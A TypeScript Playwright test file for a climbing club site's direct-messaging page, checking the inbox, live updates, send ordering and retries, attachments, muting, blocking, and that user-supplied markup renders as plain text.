    resetMessages();
    const { browser, page } = await openTwin(type, "/messages", TOKEN, undefined, { fakeLive: true });
    try {
      const personal = page.locator("polynet-personal");
      await expect.poll(() => personal.getAttribute("state")).toBe("ready");
      expect(await page.title()).toBe("Messages · Sunrise Climbing Club");
      expect(await page.locator("polynet-page .pn-page-heading").textContent()).toBe("Messages");
      // The inbox: newest first, unread and muted marked, names as text, never markup.
      const rows = personal.locator("[part=conversation]");
      await expect.poll(() => rows.count()).toBe(2);
      expect(await personal.locator("[part=conversation-name]").allTextContents()).toEqual(["Sam Rivera", "Night <b>Owl</b>"]);
      expect(await rows.first().locator("[part=unread]").textContent()).toBe("2");
      expect(await rows.nth(1).locator("[part=muted-mark]").textContent()).toBe("Muted");
      expect(await personal.locator("[part=conversation-preview]").allTextContents()).toEqual(["See you at 7?", "You: thanks"]);
      // Search by name.
      await personal.locator("[part=search]").fill("owl");
      await expect.poll(() => rows.count()).toBe(1);
      await personal.locator("[part=search]").fill("");
      // Live: one watch, at Polynet's live origin, with the twin session's watch token.
      await expect.poll(() => watching(page)).toEqual([["communityLive:watchMessages", STORAGE, null, true]]);
      // Open Sam's: the conversation at its own address, read up to the newest message.
      await rows.first().click();
      await page.waitForURL(`${TWIN}/messages/${SAM}`);
      const log = personal.locator("[part=log]");
      await expect.poll(() => log.locator("[part~=message]").count()).toBe(2);
      expect(await personal.locator("[part=thread-header] h2").textContent()).toBe("Sam Rivera");
      expect(await personal.locator("[part=peer-link]").getAttribute("href")).toBe(`${SITE}/people/sam`);
      // Text stays text; web addresses are links that open apart.
      const first = log.locator("[part~=message]").first();
      expect(await first.locator("[part=bubble]").textContent()).toBe("Morning! Route: https://example.com/route <b>x</b>");
      expect(await first.locator("[part=bubble] b").count()).toBe(0);
      expect(await first.locator("a").evaluate((link) => [link.getAttribute("href"), link.getAttribute("target"), link.getAttribute("rel")]))
        .toEqual(["https://example.com/route", "_blank", "noopener noreferrer nofollow"]);
      await expect.poll(() => dmCalls("read")).toEqual([{ conversation_id: SAM, through_seq: 2 }]);
      await expect.poll(() => rows.first().locator("[part=unread]").count()).toBe(0);
      expect(await rows.first().getAttribute("aria-current")).toBe("page");
      await expect.poll(() => watching(page)).toEqual([["communityLive:watchMessages", STORAGE, null, true], ["communityLive:watchMessages", STORAGE, SAM, true]]);
      // Typing out: Studio's lease, renewed while typing; sending clears it.
      const input = personal.locator("[part=input]");
      await input.pressSequentially("Hello Sam");
      await expect.poll(() => dmCalls("typing")[0]).toEqual({ conversation_id: SAM, typing: true });
      await input.press("Enter");
      await expect.poll(() => dmCalls("send").length).toBe(1);
      expect(dmCalls("send")[0]).toEqual({ conversation_id: SAM, text: "Hello Sam", attachments: [], client_message_id: expect.stringMatching(/^[0-9a-f]{32}$/) });
      await expect.poll(() => log.locator("[part~=message-mine]").allTextContents()).toEqual([expect.stringContaining("Hello Sam")]);
      expect(dmCalls("typing").at(-1)).toEqual({ conversation_id: SAM, typing: false });
      expect(await input.inputValue()).toBe("");
      // Live: Sam replies and is typing; the page re-reads and says so. Then Sam stops.
      dm.messages[SAM].push({ id: "m4", seq: 4, from_me: false, text: "On my way", attachments: [], created_at: new Date().toISOString(), client_message_id: null });
      await answerWatch(page, SAM, { ok: true, version: "v2", typing: { lease_until: Date.now() + 4000, expires_in_ms: 4000 } });
      await expect.poll(() => log.locator("[part~=message-theirs]").last().textContent()).toContain("On my way");
      expect(await personal.locator("[part=typing]").textContent()).toBe("Sam Rivera is typing…");
      await answerWatch(page, SAM, { ok: true, version: "v2", typing: null });
      await expect.poll(() => personal.locator("[part=typing]").textContent()).toBe("");
      // Read state: once Sam has read the member's last message, it says so.
      dm.messages[SAM].push({ id: "sent5", seq: 5, from_me: true, text: "See you there", attachments: [], created_at: new Date().toISOString(), client_message_id: null });
      dm.conversations[0].peer_read_seq = 5;
      await answerWatch(page, SAM, { ok: true, version: "v3", typing: null });
      await expect.poll(() => personal.locator("[part=seen]").textContent()).toBe("Seen");
      // The inbox follows its own signal.
      dm.conversations[1].unread_count = 4;
      await answerWatch(page, null, { ok: true, version: "i2" });
      await expect.poll(() => rows.nth(1).locator("[part=unread]").textContent()).toBe("4");
      // Back to the inbox, by the browser's Back.
      await page.goBack();
      await expect.poll(() => watching(page)).toEqual([["communityLive:watchMessages", STORAGE, null, true]]);
      expect(await page.evaluate(() => (window as any).siteRan)).toBeUndefined();
      expect(await page.evaluate(() => (window as any).violations)).toEqual([]);
    } finally {
      await browser.close();
    }
  }, 60_000);
}

test("Messages: a profile's Message starts a conversation with the first message; one that exists opens directly; a refusal says so", async () => {
  resetMessages();
  const { browser, page } = await openTwin(chromium, "/messages/new?to=newbie", TOKEN, undefined, { fakeLive: true });
  try {
    const personal = page.locator("polynet-personal");
    await expect.poll(() => personal.locator("[part=thread-header] h2").textContent()).toBe("Newbie");
    expect(await personal.locator("[part=log] [part=empty]").textContent()).toBe("Say hello to Newbie.");
    // Nothing to mute or block until there's a conversation, and nothing created yet.
    expect(await personal.locator("[part=mute], [part=block]").count()).toBe(0);
    expect(dmCalls("send")).toEqual([]);
    const input = personal.locator("[part=input]");
    await input.fill("Welcome to the club!");
    await personal.locator("[part=send]").click();
    await page.waitForURL(`${TWIN}/messages/${NEWBIE}`);
    expect(dmCalls("send")).toEqual([{ to: "newbie", text: "Welcome to the club!", attachments: [], client_message_id: expect.any(String) }]);
    await expect.poll(() => personal.locator("[part~=message-mine]").allTextContents()).toEqual([expect.stringContaining("Welcome to the club!")]);
    await expect.poll(() => personal.locator("[part=conversation-name]").first().textContent()).toBe("Newbie");
    // Someone the member already talks to: straight to that conversation (Back skips the hop).
    await page.goto(`${TWIN}/messages/new?to=sam`);
    await page.waitForURL(`${TWIN}/messages/${SAM}`);
    await expect.poll(() => personal.locator("[part=thread-header] h2").textContent()).toBe("Sam Rivera");
    // Someone they can't message: Studio's words, and the way back.
    await page.goto(`${TWIN}/messages/new?to=outsider`);
    await expect.poll(() => personal.locator("[part=thread] [role=alert] p").textContent()).toBe("You can't message this person right now.");
    expect(await page.evaluate(() => (window as any).violations)).toEqual([]);
  } finally {
    await browser.close();
  }
}, 60_000);

function hold(): [Promise<void>, () => void] {
  let release = () => {};
  const held = new Promise<void>((resolve) => { release = resolve; });
  return [held, release];
}

test("Messages: two sends whose replies come back in reverse still show in order", async () => {
  resetMessages();
  const { browser, page } = await openTwin(chromium, `/messages/${SAM}`, TOKEN, undefined, { fakeLive: true });
  try {
    const personal = page.locator("polynet-personal");
    const seqs = () => personal.locator("[part~=message][data-seq]").evaluateAll((nodes) => nodes.map((node) => Number(node.getAttribute("data-seq"))));
    await expect.poll(seqs).toEqual([1, 2]);
    const [late, release] = hold();
    dm.holdNextSendReply = late;
    const input = personal.locator("[part=input]");
    await input.fill("First");
    await personal.locator("[part=send]").click();
    await expect.poll(() => dm.held).toBe(1);
    await input.fill("Second");
    await personal.locator("[part=send]").click();
    await expect.poll(seqs).toEqual([1, 2, 4]);
    release();
    await expect.poll(seqs).toEqual([1, 2, 3, 4]);
    expect(await personal.locator("[part~=message][data-seq='3']").textContent()).toContain("First");
  } finally {
    await browser.close();
  }
}, 60_000);

test("Messages: a refresh that read the thread before a send landed doesn't drop it", async () => {
  resetMessages();
  const { browser, page } = await openTwin(chromium, `/messages/${SAM}`, TOKEN, undefined, { fakeLive: true });
  try {
    const personal = page.locator("polynet-personal");
    const seqs = () => personal.locator("[part~=message][data-seq]").evaluateAll((nodes) => nodes.map((node) => Number(node.getAttribute("data-seq"))));
    await expect.poll(seqs).toEqual([1, 2]);
    // A refresh reads [1, 2] and its reply is held; meanwhile a send lands as 3.
    const [slow, release] = hold();
    dm.holdNextConversation = slow;
    await page.evaluate(() => document.dispatchEvent(new Event("visibilitychange")));
    await expect.poll(() => dm.held).toBe(1);
    await personal.locator("[part=input]").fill("Still here");
    await personal.locator("[part=send]").click();
    await expect.poll(seqs).toEqual([1, 2, 3]);
    release();
    await page.waitForTimeout(300);
    expect(await seqs()).toEqual([1, 2, 3]);
    expect(await personal.locator("[part~=message-pending]").count()).toBe(0);
  } finally {
    await browser.close();
  }
}, 60_000);

test("Messages: unblocked or muted elsewhere, the open thread follows on refresh", async () => {
  resetMessages();
  dm.conversations[0].blocked = true;
  const { browser, page } = await openTwin(chromium, `/messages/${SAM}`, TOKEN, undefined, { fakeLive: true });
  try {
    const personal = page.locator("polynet-personal");
    await expect.poll(() => personal.locator("[part=blocked-note]").count()).toBe(1);
    expect(await personal.locator("[part=block]").textContent()).toBe("Unblock");
    // Unblocked and muted in Studio; this tab comes back into view.
    dm.conversations[0].blocked = false;
    dm.conversations[0].muted = true;
    await page.evaluate(() => document.dispatchEvent(new Event("visibilitychange")));
    await expect.poll(() => personal.locator("[part=input]").count()).toBe(1);
    expect(await personal.locator("[part=block]").textContent()).toBe("Block");
    expect(await personal.locator("[part=mute]").getAttribute("aria-pressed")).toBe("true");
    // A draft and an attached file survive the next change.
    await personal.locator("[part=input]").fill("Sorry about that");
    await personal.locator("input[type=file]").setInputFiles({ name: "wall.png", mimeType: "image/png", buffer: Buffer.from(PNG, "base64") });
    await expect.poll(() => personal.locator("[part=chip]").getAttribute("data-state")).toBe("ready");
    dm.conversations[0].muted = false;
    await page.evaluate(() => document.dispatchEvent(new Event("visibilitychange")));
    await expect.poll(() => personal.locator("[part=mute]").getAttribute("aria-pressed")).toBe("false");
    expect(await personal.locator("[part=input]").inputValue()).toBe("Sorry about that");
    expect(await personal.locator("[part=chip]").count()).toBe(1);
    expect(await personal.locator("[part=attachments]").isVisible()).toBe(true);
  } finally {
    await browser.close();
  }
}, 60_000);

test("Messages: text typed while a just-made thread loads is kept", async () => {
  resetMessages();
  const { browser, page } = await openTwin(chromium, "/messages/new?to=newbie", TOKEN, undefined, { fakeLive: true });
  try {
    const personal = page.locator("polynet-personal");
    await expect.poll(() => personal.locator("[part=thread-header] h2").textContent()).toBe("Newbie");
    const [slow, release] = hold();
    dm.holdNextConversation = slow;
    await personal.locator("[part=input]").fill("Welcome!");
    await personal.locator("[part=send]").click();
    await expect.poll(() => dm.held).toBe(1);
    await personal.locator("[part=input]").fill("Bring shoes");
    release();
    await expect.poll(() => personal.locator("[part=mute]").count()).toBe(1);
    expect(await personal.locator("[part=input]").inputValue()).toBe("Bring shoes");
  } finally {
    await browser.close();
  }
}, 60_000);

// Holds the next send at the backend until the returned release is called.
async function holdNextSend(): Promise<() => void> {
  let release = () => {};
  dm.holdNextSend = new Promise<void>((resolve) => { release = resolve; });
  return release;
}

test("Messages: re-reading the same thread mid-send doesn't strand the send", async () => {
  resetMessages();
  const { browser, page } = await openTwin(chromium, `/messages/${SAM}`, TOKEN, undefined, { fakeLive: true });
  try {
    const personal = page.locator("polynet-personal");
    await expect.poll(() => personal.locator("[part=thread-header] h2").textContent()).toBe("Sam Rivera");
    const release = await holdNextSend();
    await personal.locator("[part=input]").fill("Running late");
    await personal.locator("[part=send]").click();
    await expect.poll(() => dm.held).toBe(1);
    // A refresh of this same thread (tab focus) lands while the send is out.
    const reads = dmCalls("conversation").length;
    await page.evaluate(() => document.dispatchEvent(new Event("visibilitychange")));
    await expect.poll(() => dmCalls("conversation").length).toBeGreaterThan(reads);
    release();
    await expect.poll(() => personal.locator("[part~=message-pending]").count()).toBe(0);
    await expect.poll(() => personal.locator("[part~=message-mine]").last().textContent()).toContain("Running late");
  } finally {
    await browser.close();
  }
}, 60_000);

test("Messages: after more than a page arrives, the thread restarts at the newest page and pages back without a gap", async () => {
  resetMessages();
  dm.pageSize = 3;
  const { browser, page } = await openTwin(chromium, `/messages/${SAM}`, TOKEN, undefined, { fakeLive: true });
  try {
    const personal = page.locator("polynet-personal");
    const seqs = () => personal.locator("[part~=message][data-seq]").evaluateAll((nodes) => nodes.map((node) => Number(node.getAttribute("data-seq"))));
    await expect.poll(seqs).toEqual([1, 2]);
    // Five arrive while the tab is away: more than a page.
    const row = dm.conversations[0];
    for (let index = 0; index < 5; index += 1) {
      row.last_seq += 1;
      dm.messages[SAM].push({ id: `away${row.last_seq}`, seq: row.last_seq, from_me: false, text: `Away ${row.last_seq}`, attachments: [], created_at: new Date().toISOString(), client_message_id: null });
    }
    await page.evaluate(() => document.dispatchEvent(new Event("visibilitychange")));
    await expect.poll(seqs).toEqual([5, 6, 7]);
    await personal.locator("[part=older]").click();
    await expect.poll(seqs).toEqual([2, 3, 4, 5, 6, 7]);
    await personal.locator("[part=older]").click();
    await expect.poll(seqs).toEqual([1, 2, 3, 4, 5, 6, 7]);
  } finally {
    await browser.close();
  }
}, 60_000);

test("Messages: a read receipt that fails is sent again on the next refresh", async () => {
  resetMessages();
  dm.failRead = true;
  const { browser, page } = await openTwin(chromium, `/messages/${SAM}`, TOKEN, undefined, { fakeLive: true });
  try {
    const personal = page.locator("polynet-personal");
    await expect.poll(() => dmCalls("read").length).toBe(1);
    expect(dm.conversations[0].read_seq).toBe(0);
    await page.evaluate(() => document.dispatchEvent(new Event("visibilitychange")));
    await expect.poll(() => dmCalls("read").length).toBe(2);
    expect(dmCalls("read")[1]).toEqual({ conversation_id: SAM, through_seq: 2 });
    await expect.poll(() => dm.conversations[0].read_seq).toBe(2);
    expect(await personal.locator("[part=thread-header] h2").textContent()).toBe("Sam Rivera");
  } finally {
    await browser.close();
  }
}, 60_000);

test("Messages: when the first message makes the thread, other sends and the draft stay", async () => {
  resetMessages();
  const { browser, page } = await openTwin(chromium, "/messages/new?to=newbie", TOKEN, undefined, { fakeLive: true });
  try {
    const personal = page.locator("polynet-personal");
    await expect.poll(() => personal.locator("[part=thread-header] h2").textContent()).toBe("Newbie");
    const input = personal.locator("[part=input]");
    const release = await holdNextSend();
    await input.fill("Welcome!");
    await personal.locator("[part=send]").click();
    await expect.poll(() => dm.held).toBe(1);
    // A second send is refused while the first is still out; then a draft.
    dm.failSend = "dm_rate_limited";
    await input.fill("Climb Saturday?");
    await personal.locator("[part=send]").click();
    const pending = personal.locator("[part~=message-pending]");
    await expect.poll(() => pending.locator("[part=meta]").allTextContents()).toContainEqual(expect.stringContaining("too quickly"));
    await input.fill("Bring shoes");
    release();
    await page.waitForURL(`${TWIN}/messages/${NEWBIE}`);
    await expect.poll(() => personal.locator("[part=mute]").count()).toBe(1);
    await expect.poll(() => personal.locator("[part~=message-mine]:not([part~=message-pending])").allTextContents()).toEqual([expect.stringContaining("Welcome!")]);
    expect(await pending.count()).toBe(1);
    expect(await pending.textContent()).toContain("Climb Saturday?");
    expect(await personal.locator("[part=input]").inputValue()).toBe("Bring shoes");
    // Its Retry now goes to the new thread, under the same key.
    await pending.getByRole("button", { name: "Retry" }).click();
    await expect.poll(() => pending.count()).toBe(0);
    const [refused, retried] = dmCalls("send").filter((call) => call.text === "Climb Saturday?");
    expect(refused).toMatchObject({ to: "newbie" });
    expect(retried).toMatchObject({ conversation_id: NEWBIE, client_message_id: refused.client_message_id });
    expect(dm.messages[NEWBIE].map((message) => message.text)).toEqual(["Welcome!", "Climb Saturday?"]);
  } finally {
    await browser.close();
  }
}, 60_000);

test("Messages: mute; attachments straight to storage; a failed send kept with Retry under the same key; block asks first", async () => {
  resetMessages();
  const { browser, page } = await openTwin(chromium, `/messages/${SAM}`, TOKEN, undefined, { fakeLive: true });
  try {
    const personal = page.locator("polynet-personal");
    const mute = personal.locator("[part=mute]");
    await expect.poll(() => mute.getAttribute("aria-pressed")).toBe("false");
    await mute.click();
    await expect.poll(() => mute.getAttribute("aria-pressed")).toBe("true");
    expect(dmCalls("mute")).toEqual([{ conversation_id: SAM, muted: true }]);
    await expect.poll(() => personal.locator("[part=conversation]").first().locator("[part=muted-mark]").count()).toBe(1);
    // A photo: an upload address from the twin, the file straight to Polynet's storage.
    uploads.length = 0;
    await personal.locator("input[type=file]").setInputFiles({ name: "wall.png", mimeType: "image/png", buffer: Buffer.from(PNG, "base64") });
    const chip = personal.locator("[part=chip]");
    await expect.poll(() => chip.getAttribute("data-state")).toBe("ready");
    expect(uploads).toEqual([{ type: "image/png", bytes: expect.any(Number) }]);
    expect(dmCalls("upload")).toEqual([{ conversation_id: SAM }]);
    // Something that can't be sent never uploads.
    await personal.locator("input[type=file]").setInputFiles({ name: "run.exe", mimeType: "application/x-msdownload", buffer: Buffer.from("MZ") });
    await expect.poll(() => personal.locator("[part=composer] [part=error]").textContent()).toBe("run.exe: That kind of file can't be sent.");
    expect(uploads).toHaveLength(1);
    // Refused: kept on screen with Studio's words and Retry; the retry is the same message.
    dm.failSend = "dm_rate_limited";
    await personal.locator("[part=input]").fill("The wall today");
    await personal.locator("[part=send]").click();
    const pending = personal.locator("[part~=message-pending]");
    await expect.poll(() => pending.locator("[part=meta]").textContent()).toContain("You're sending messages too quickly. Give it a minute and try again.");
    await pending.getByRole("button", { name: "Retry" }).click();
    await expect.poll(() => dmCalls("send").length).toBe(2);
    const [failed, retried] = dmCalls("send");
    expect(retried).toEqual(failed);
    expect(retried).toMatchObject({ conversation_id: SAM, text: "The wall today", attachments: [{ storage_id: "kg2photo", name: "wall.png", type: "image" }] });
    await expect.poll(() => personal.locator("[part~=message-mine] img").getAttribute("src")).toBe(`${STORAGE}/api/storage/kg2photo`);
    await expect.poll(() => pending.count()).toBe(0);
    // Block asks first; Cancel changes nothing.
    await personal.locator("[part=block]").click();
    expect(await personal.locator("[part=confirm] p").first().textContent())
      .toBe("Block Sam Rivera? Neither of you will be able to message the other. You can unblock them later.");
    await personal.getByRole("button", { name: "Cancel" }).click();
    expect(dmCalls("block")).toEqual([]);
    await personal.locator("[part=block]").click();
    await personal.locator("[part=block-confirm]").click();
    await expect.poll(() => personal.locator("[part=blocked-note]").textContent()).toBe("You blocked Sam Rivera. Unblock them to message each other again.");
    expect(dmCalls("block")).toEqual([{ conversation_id: SAM, blocked: true }]);
    expect(await personal.locator("[part=input]").count()).toBe(0);
    expect(await personal.locator("[part=block]").textContent()).toBe("Unblock");
    expect(await page.evaluate(() => (window as any).violations)).toEqual([]);
  } finally {
    await browser.close();
  }
}, 60_000);

test("Messages: the real live client loads from the twin and opens its socket to Polynet's live origin, inside the page's policy", async () => {
  resetMessages();
  const { browser, page } = await openTwin(chromium, "/messages", TOKEN);
  try {
    // The test's live origin doesn't exist, so the socket fails to connect, after the page's policy let it try.
    const console: string[] = [];
    page.on("console", (message) => console.push(message.text()));
    await page.reload();
    const personal = page.locator("polynet-personal");
    await expect.poll(() => personal.locator("[part=conversation]").count()).toBe(2);
    await expect.poll(() => page.evaluate(() => typeof (window as any).convex?.ConvexClient)).toBe("function");
    await expect.poll(() => console.some((line) => line.includes("WebSocket connection to 'wss://live.example.convex.cloud/"))).toBe(true);
    expect(console.filter((line) => /Content Security Policy|Refused to/i.test(line))).toEqual([]);
    expect(await page.evaluate(() => (window as any).violations)).toEqual([]);
  } finally {
    await browser.close();
  }
}, 60_000);

test("Messages: a session the backend refuses shows the page's own sign-in, and nothing of anyone's messages", async () => {
  resetMessages();
  const { browser, page } = await openTwin(chromium, `/messages/${SAM}`, REFUSED, undefined, { fakeLive: true });
  try {
    const personal = page.locator("polynet-personal");
    await expect.poll(() => personal.getAttribute("state")).toBe("signed-out");
    expect(await personal.locator("[part=signin]").textContent()).toBe("Sign in");
    expect(await personal.textContent()).not.toContain("Sam");
    // Nothing left watching once it's signed out.
    await expect.poll(() => watching(page)).toEqual([]);
  } finally {
    await browser.close();
  }
}, 60_000);
